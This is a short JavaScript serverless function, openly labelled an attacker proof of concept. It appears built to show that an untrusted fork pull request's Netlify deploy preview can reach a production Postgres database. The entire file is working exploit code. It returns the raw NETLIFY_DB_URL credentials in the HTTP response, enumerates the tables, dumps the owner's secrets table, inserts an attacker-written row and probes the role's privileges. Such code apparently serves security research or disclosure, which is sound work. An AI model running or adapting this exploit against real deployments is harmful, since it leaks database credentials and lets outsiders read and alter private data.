// ATTACKER function, deployed by the untrusted external fork pull request.
// Connects to whatever Postgres NETLIFY_DB_URL points at and tries to read the
// owner's table, which only production code ever wrote to.
import pg from "pg";
export default async (req, context) => {
  const out = { ts: new Date().toISOString(), side: "untrusted fork-PR deploy preview" };
  const url = process.env.NETLIFY_DB_URL || null;
  out.raw_url = url;
  try { const u = new URL(url); out.db = { user: u.username, host: u.host, database: u.pathname.slice(1) }; } catch (e) {}
  const c = new pg.Client({ connectionString: url, ssl: { rejectUnauthorized: false } });
  const safe = async (n, f) => { try { out[n] = await f(); } catch (e) { out[n] = { error: String(e).slice(0, 300) }; } };
  try {
    await c.connect();
    await safe("identity", async () => (await c.query("SELECT current_database() db, current_user usr, inet_server_addr() addr")).rows[0]);
    await safe("all_tables", async () => (await c.query("SELECT table_schema, table_name FROM information_schema.tables WHERE table_schema NOT IN ('pg_catalog','information_schema')")).rows);
    await safe("read_owner_table", async () => (await c.query("SELECT id, note, created_at FROM exodia_owner_secrets ORDER BY id")).rows);
    await safe("write_as_attacker", async () => {
      await c.query("INSERT INTO exodia_owner_secrets (note) VALUES ($1)", ["WRITTEN-BY-UNTRUSTED-FORK-PR-" + new Date().toISOString()]);
      return { inserted: true };
    });
    await safe("role_privileges", async () => (await c.query("SELECT rolname, rolsuper, rolcreatedb, rolcreaterole FROM pg_roles WHERE rolname = current_user")).rows[0]);
  } catch (e) { out.connect_error = String(e).slice(0, 400); }
  finally { try { await c.end(); } catch (e) {} }
  return new Response(JSON.stringify(out, null, 2), { headers: { "content-type": "application/json", "cache-control": "no-store" } });
};